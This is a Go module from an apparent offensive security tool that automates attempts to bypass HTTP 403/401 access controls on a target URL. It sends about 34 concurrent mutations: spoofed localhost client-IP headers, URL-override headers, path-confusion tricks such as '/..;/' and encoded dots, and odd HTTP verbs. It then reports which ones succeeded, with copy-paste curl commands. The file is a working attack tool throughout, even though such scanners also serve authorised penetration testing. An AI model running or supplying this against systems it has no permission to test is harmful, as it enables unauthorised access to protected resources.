package modules

import (
	"fmt"
	"net/url"
	"nightfalllx/pkg/client"
	"strings"
	"sync"
	"time"
)

// BypassResult represents a tested 403/401 authorization bypass technique.
type BypassResult struct {
	Category      string            `json:"category"`
	Technique     string            `json:"technique"`
	Method        string            `json:"method"`
	URL           string            `json:"url"`
	Headers       map[string]string `json:"headers,omitempty"`
	StatusCode    int               `json:"status_code"`
	ContentLength int               `json:"content_length"`
	CurlCommand   string            `json:"curl_command"`
	Success       bool              `json:"success"`
}

// BypassReport aggregates all tested 403/401 bypass vectors on a target endpoint.
type BypassReport struct {
	TargetURL      string         `json:"target_url"`
	BaselineStatus int            `json:"baseline_status"`
	BaselineLength int            `json:"baseline_length"`
	TotalTested    int            `json:"total_tested"`
	Successful     []BypassResult `json:"successful"`
	AllResults     []BypassResult `json:"all_results"`
	Duration       time.Duration  `json:"duration"`
}

type bypassVector struct {
	category    string
	technique   string
	method      string
	pathModify  func(origPath string) string
	headers     map[string]string
}

// generateCurl generates a copy-pasteable curl reproduction command.
func generateCurl(method, reqURL string, headers map[string]string) string {
	var parts []string
	parts = append(parts, fmt.Sprintf("curl -i -s -k -X %s", method))
	for k, v := range headers {
		parts = append(parts, fmt.Sprintf("-H '%s: %s'", k, v))
	}
	parts = append(parts, fmt.Sprintf("'%s'", reqURL))
	return strings.Join(parts, " ")
}

// Run403Bypass executes 30+ header, path, and method mutations to bypass 403 Forbidden / 401 Unauthorized.
func Run403Bypass(rawURL string, c *client.Client) *BypassReport {
	start := time.Now()

	u, err := url.Parse(rawURL)
	if err != nil {
		return &BypassReport{TargetURL: rawURL}
	}

	origPath := u.Path
	if origPath == "" {
		origPath = "/"
	}

	// 1. Baseline Request
	baselineResp, err := c.Request("GET", rawURL, "", nil)
	baselineStatus := 0
	baselineLen := 0
	if err == nil && baselineResp != nil {
		baselineStatus = baselineResp.StatusCode
		baselineLen = baselineResp.Bytes
	}

	report := &BypassReport{
		TargetURL:      rawURL,
		BaselineStatus: baselineStatus,
		BaselineLength: baselineLen,
	}

	cleanPath := strings.Trim(origPath, "/")

	// 2. Build 30+ bypass attack vectors
	vectors := []bypassVector{
		// A. Header Injection Vectors (Reverse Proxy & IP Whitelist Spoofing)
		{category: "Header Tampering", technique: "X-Original-URL Override", method: "GET", headers: map[string]string{"X-Original-URL": origPath}},
		{category: "Header Tampering", technique: "X-Rewrite-URL Override", method: "GET", headers: map[string]string{"X-Rewrite-URL": origPath}},
		{category: "Header Tampering", technique: "X-Forwarded-For Localhost", method: "GET", headers: map[string]string{"X-Forwarded-For": "127.0.0.1"}},
		{category: "Header Tampering", technique: "X-Forwarded-For Port 80", method: "GET", headers: map[string]string{"X-Forwarded-For": "127.0.0.1:80"}},
		{category: "Header Tampering", technique: "X-Forwarded-Host Localhost", method: "GET", headers: map[string]string{"X-Forwarded-Host": "localhost"}},
		{category: "Header Tampering", technique: "X-Custom-IP-Authorization", method: "GET", headers: map[string]string{"X-Custom-IP-Authorization": "127.0.0.1"}},
		{category: "Header Tampering", technique: "X-Real-IP Localhost", method: "GET", headers: map[string]string{"X-Real-IP": "127.0.0.1"}},
		{category: "Header Tampering", technique: "X-Remote-IP Localhost", method: "GET", headers: map[string]string{"X-Remote-IP": "127.0.0.1"}},
		{category: "Header Tampering", technique: "X-Client-IP Localhost", method: "GET", headers: map[string]string{"X-Client-IP": "127.0.0.1"}},
		{category: "Header Tampering", technique: "X-Originating-IP Localhost", method: "GET", headers: map[string]string{"X-Originating-IP": "127.0.0.1"}},
		{category: "Header Tampering", technique: "Client-IP Header", method: "GET", headers: map[string]string{"Client-IP": "127.0.0.1"}},
		{category: "Header Tampering", technique: "True-Client-IP Header", method: "GET", headers: map[string]string{"True-Client-IP": "127.0.0.1"}},
		{category: "Header Tampering", technique: "Cluster-Client-IP Header", method: "GET", headers: map[string]string{"Cluster-Client-IP": "127.0.0.1"}},

		// B. Path Normalization & Parser Confusion Mutations
		{category: "Path Normalization", technique: "Trailing Slash Append", method: "GET", pathModify: func(p string) string { return strings.TrimSuffix(p, "/") + "/" }},
		{category: "Path Normalization", technique: "Dot Segment (/.)", method: "GET", pathModify: func(p string) string { return strings.TrimSuffix(p, "/") + "/." }},
		{category: "Path Normalization", technique: "Semicolon Traversal (/..;/)", method: "GET", pathModify: func(p string) string { return strings.TrimSuffix(p, "/") + "/..;/" + cleanPath }},
		{category: "Path Normalization", technique: "Path Semicolon Append (;)", method: "GET", pathModify: func(p string) string { return strings.TrimSuffix(p, "/") + ";" }},
		{category: "Path Normalization", technique: "Encoded Dot (/%2e/)", method: "GET", pathModify: func(p string) string { return "/%2e/" + cleanPath }},
		{category: "Path Normalization", technique: "URL Double Slash (//path//)", method: "GET", pathModify: func(p string) string { return "//" + cleanPath + "//" }},
		{category: "Path Normalization", technique: "Trailing URL Whitespace (%20)", method: "GET", pathModify: func(p string) string { return strings.TrimSuffix(p, "/") + "%20" }},
		{category: "Path Normalization", technique: "Trailing URL Tab (%09)", method: "GET", pathModify: func(p string) string { return strings.TrimSuffix(p, "/") + "%09" }},
		{category: "Path Normalization", technique: "Uppercase Permutation", method: "GET", pathModify: func(p string) string { return "/" + strings.ToUpper(cleanPath) }},
		{category: "Path Normalization", technique: "Query Parameter Append (?)", method: "GET", pathModify: func(p string) string { return strings.TrimSuffix(p, "/") + "?" }},
		{category: "Path Normalization", technique: "Double Query Append (??)", method: "GET", pathModify: func(p string) string { return strings.TrimSuffix(p, "/") + "??" }},
		{category: "Path Normalization", technique: "Arbitrary Query Param (?bypass=1)", method: "GET", pathModify: func(p string) string { return strings.TrimSuffix(p, "/") + "?bypass=1" }},
		{category: "Path Normalization", technique: "JSON Extension Rewrite (.json)", method: "GET", pathModify: func(p string) string { return strings.TrimSuffix(p, "/") + ".json" }},
		{category: "Path Normalization", technique: "Semicolon JSON Append (;.json)", method: "GET", pathModify: func(p string) string { return strings.TrimSuffix(p, "/") + ";.json" }},
		{category: "Path Normalization", technique: "HTML Extension Rewrite (.html)", method: "GET", pathModify: func(p string) string { return strings.TrimSuffix(p, "/") + ".html" }},

		// C. HTTP Verb / Method Manipulations
		{category: "HTTP Verb", technique: "POST Method", method: "POST"},
		{category: "HTTP Verb", technique: "HEAD Method", method: "HEAD"},
		{category: "HTTP Verb", technique: "TRACE Method", method: "TRACE"},
		{category: "HTTP Verb", technique: "PATCH Method", method: "PATCH"},
		{category: "HTTP Verb", technique: "CONNECT Method", method: "CONNECT"},
		{category: "HTTP Verb", technique: "Custom Verb (INVENTED)", method: "INVENTED"},
	}

	report.TotalTested = len(vectors)

	// Concurrency pool
	var wg sync.WaitGroup
	sem := make(chan struct{}, 10)
	var mu sync.Mutex

	for _, v := range vectors {
		vec := v
		wg.Add(1)
		go func() {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			// Build target test URL
			targetTestURL := rawURL
			if vec.pathModify != nil {
				cloneURL, _ := url.Parse(rawURL)
				cloneURL.Path = vec.pathModify(origPath)
				targetTestURL = cloneURL.String()
			}

			method := vec.method
			if method == "" {
				method = "GET"
			}

			resp, err := c.Request(method, targetTestURL, "", vec.headers)
			if err != nil || resp == nil {
				return
			}

			curlCmd := generateCurl(method, targetTestURL, vec.headers)

			// Success Condition:
			// If baseline was 403 or 401, and this returned 200, 302, 301, 204 or significant diff
			isSuccess := false
			if (baselineStatus == 403 || baselineStatus == 401) &&
				(resp.StatusCode == 200 || resp.StatusCode == 302 || resp.StatusCode == 301 || resp.StatusCode == 204) {
				isSuccess = true
			} else if baselineStatus != 0 && resp.StatusCode != baselineStatus && resp.StatusCode < 400 {
				isSuccess = true
			}

			res := BypassResult{
				Category:      vec.category,
				Technique:     vec.technique,
				Method:        method,
				URL:           targetTestURL,
				Headers:       vec.headers,
				StatusCode:    resp.StatusCode,
				ContentLength: resp.Bytes,
				CurlCommand:   curlCmd,
				Success:       isSuccess,
			}

			mu.Lock()
			report.AllResults = append(report.AllResults, res)
			if isSuccess {
				report.Successful = append(report.Successful, res)
			}
			mu.Unlock()
		}()
	}

	wg.Wait()
	report.Duration = time.Since(start)
	return report
}

// PrintBypassReport prints an interactive, rich terminal view of bypass attempts and working curl commands.
func PrintBypassReport(rep *BypassReport) {
	fmt.Println()
	fmt.Println("\033[1;31m╔══════════════════════════════════════════════════════════════════════════════╗\033[0m")
	fmt.Println("\033[1;31m║   🔓  NightfallLX High-Yield 403 / 401 Authorization Bypass Engine          ║\033[0m")
	fmt.Printf("\033[1;31m║   Target URL    : \033[1;37m%-58s\033[1;31m ║\033[0m\n", rep.TargetURL)
	fmt.Printf("\033[1;31m║   Baseline HTTP : \033[1;33m[%d] (Length: %d bytes)\033[1;31m%-34s ║\033[0m\n", rep.BaselineStatus, rep.BaselineLength, "")
	fmt.Println("\033[1;31m╚══════════════════════════════════════════════════════════════════════════════╝\033[0m")
	fmt.Println()

	if len(rep.Successful) == 0 {
		fmt.Printf("\033[33m[-] Tested %d bypass vectors: No direct 403 bypass identified on %s\033[0m\n", rep.TotalTested, rep.TargetURL)
		fmt.Printf("\033[36m[*] Pro Tip: Try combining with `-chunked` or custom Burp request `-r request.txt`\033[0m\n\n")
		return
	}

	fmt.Printf("\033[1;32m[🎯] JACKPOT! Discovered %d Successful 403/401 Bypass Technique(s):\033[0m\n\n", len(rep.Successful))

	for i, s := range rep.Successful {
		fmt.Printf("  \033[1;37m[%d]\033[0m \033[1;32m[STATUS: %d]\033[0m \033[1;36m%s\033[0m (%s)\n",
			i+1, s.StatusCode, s.Technique, s.Category)
		fmt.Printf("      ├── URL         : \033[34m%s\033[0m\n", s.URL)
		fmt.Printf("      ├── Method      : \033[1;33m%s\033[0m\n", s.Method)
		if len(s.Headers) > 0 {
			var hdrStrings []string
			for k, v := range s.Headers {
				hdrStrings = append(hdrStrings, fmt.Sprintf("%s: %s", k, v))
			}
			fmt.Printf("      ├── Headers     : \033[35m%s\033[0m\n", strings.Join(hdrStrings, ", "))
		}
		fmt.Printf("      ├── Length Diff : \033[37m%+d bytes (Baseline: %d -> Bypass: %d)\033[0m\n", s.ContentLength-rep.BaselineLength, rep.BaselineLength, s.ContentLength)
		fmt.Printf("      └── \033[1;32mReproduction\033[0m: \033[1;37m%s\033[0m\n\n", s.CurlCommand)
	}
	fmt.Printf("\033[1m[*] 403 Bypass sweep completed in %v.\033[0m\n\n", rep.Duration.Round(time.Millisecond))
}
